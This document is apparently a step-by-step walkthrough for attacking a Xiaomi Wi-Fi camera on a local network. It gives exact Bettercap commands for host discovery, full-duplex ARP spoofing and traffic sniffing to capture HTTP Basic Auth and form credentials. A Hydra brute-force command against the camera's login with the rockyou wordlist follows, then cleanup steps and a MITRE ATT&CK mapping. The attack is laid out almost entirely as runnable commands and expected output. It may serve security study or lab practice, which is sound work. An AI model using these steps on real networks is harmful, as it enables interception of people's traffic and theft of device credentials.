# Attack Flow — Step-by-Step Technical Walkthrough

## Prerequisites

- Kali Linux (or any Linux distribution with Bettercap and Hydra installed)
- Network interface in managed mode, connected to the same LAN as the target
- Root/sudo privileges
- Target Wi-Fi camera on the same subnet

## Step 1 — Identify the Target

```bash
sudo bettercap
```

Once inside the Bettercap interactive shell:

```
» net.probe on
```

Wait for endpoint discovery. Identify the camera by its MAC OUI (e.g., `XIAOMI Electronics, CO., LTD.`) and note its IP address.

**Expected output:**
```
[endpoint.new] endpoint 192.168.1.8 detected as 04:cf:8c:73:13:80 (XIAOMI Electronics,CO.,LTD.)
```

## Step 2 — Configure ARP Spoofing

```
» set arp.spoof.fullduplex true
» set arp.spoof.targets 192.168.1.8
» arp.spoof on
```

- `fullduplex` poisons both the target and the gateway — required for bidirectional interception
- Verify with `net.show` that the target's traffic is now routing through your machine

## Step 3 — Capture Traffic

```
» net.sniff on
```

Monitor the output for:
- HTTP `Authorization` headers (Basic Auth credentials in base64)
- HTTP POST bodies containing `username` / `password` fields
- DNS queries confirming the camera is communicating through your machine

## Step 4 — Credential Recovery (if needed)

If credentials are not captured in plaintext, use Hydra:

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
  192.168.1.8 http-get / -t 16 -f
```

## Step 5 — Cleanup

Stop the attack and restore the network:

```
» arp.spoof off
» net.sniff off
» exit
```

ARP tables on the target and gateway will self-heal within the ARP cache timeout (typically 60–300 seconds).

## MITRE ATT&CK Mapping

| Tactic              | Technique                                      | ID         |
|---------------------|-------------------------------------------------|------------|
| Reconnaissance      | Active Scanning: Vulnerability Scanning         | T1595.002  |
| Initial Access      | Exploit Public-Facing Application               | T1190      |
| Credential Access   | Adversary-in-the-Middle: ARP Cache Poisoning    | T1557.002  |
| Credential Access   | Brute Force: Password Guessing                  | T1110.001  |
| Collection          | Adversary-in-the-Middle                         | T1557      |
